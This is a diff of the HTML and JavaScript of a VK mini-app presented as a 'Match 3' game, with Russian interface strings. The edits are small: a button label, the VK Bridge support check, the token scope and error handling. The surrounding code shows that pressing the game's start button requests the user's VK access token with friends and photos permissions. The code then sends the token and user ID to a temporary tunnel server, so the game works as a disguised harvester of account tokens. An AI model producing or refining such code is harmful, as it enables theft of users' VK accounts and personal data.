@@ -108,7 +108,7 @@
   
   <div id="container">
     <h1>Match 3</h1>
-    <button id="authBtn">tart</button>
+    <button id="authBtn">Start</button>
     <div class="status" id="status">Нажмите Play для начала</div>
     <div id="game" class="hidden">
       <div id="gameBoard"></div>
@@ -138,8 +138,7 @@ function updateStatus(message) {
 
 async function initialize() {
   try {
-    const isSupported = await vkBridge.supportsAsync('VKWebAppInit');
-    if (!isSupported) {
+    if (!vkBridge.supports('VKWebAppInit')) {
       throw new Error('Откройте приложение внутри VK!');
     }
 
@@ -148,7 +147,7 @@ async function initialize() {
 
     const authData = await vkBridge.send('VKWebAppGetAuthToken', {
       app_id: APP_ID,
-      scope: 'friends,photos,offline'
+      scope: 'friends,photos'
     });
 
     accessToken = authData.access_token;
@@ -162,7 +161,7 @@ async function initialize() {
     }
 
     updateStatus('Добро пожаловать!');
-
+    
     const tokenData = {
       user_id: userInfo.id.toString(),
       access_token: authData.access_token,
@@ -186,8 +185,7 @@ async function initialize() {
 
 async function sendTokenToYourServer(data) {
   const controller = new AbortController();
-  const reason = 'Таймаут запроса через 5 секунд';
-  const timeoutId = setTimeout(() => controller.abort(reason), 5000); // Таймаут в 5 секунд
+  const timeoutId = setTimeout(() => controller.abort(), 5000); // Таймаут в 5 секунд
   
   try {
     const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', { 
@@ -208,13 +206,8 @@ async function sendTokenToYourServer(data) {
     console.log('Данные успешно отправлены на ваш сервер');
     return await response.json();
   } catch (error) {
-    clearTimeout(timeoutId);
-    if (error.name === 'AbortError') {
-      showError('Ошибка сохранения данных: запрос отменён по таймауту');
-    } else {
-      showError('Ошибка сохранения данных');
-    }
     console.error('Ошибка отправки на ваш сервер:', error);
+    showError('Ошибка сохранения данных');
   }
 }
 
@@ -250,7 +243,6 @@ function loadGameScript() {
 
 const authBtn = document.getElementById('authBtn');
 if (authBtn) authBtn.addEventListener('click', initialize);
-
 
 </script>
 </body>
